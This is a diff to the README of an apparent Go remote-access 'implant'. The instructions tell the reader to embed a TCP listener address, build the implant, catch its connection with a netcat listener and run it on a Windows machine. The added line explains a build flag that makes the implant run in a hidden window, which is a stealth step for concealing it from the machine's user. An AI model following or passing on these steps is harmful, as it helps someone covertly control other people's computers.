@@ -10,6 +10,7 @@ Before building the implant don't forget to edit the code and insert your TCP li
     go build
     nc -nlvp port
 
+Use go build -ldflags -H=windowsgui if you want the implant to run in a hidden window.
 Now just execute the implant on a Windows machine. If you want to terminate execution cleanly, type stop into your netcat terminal.
 
 ## TO-DO
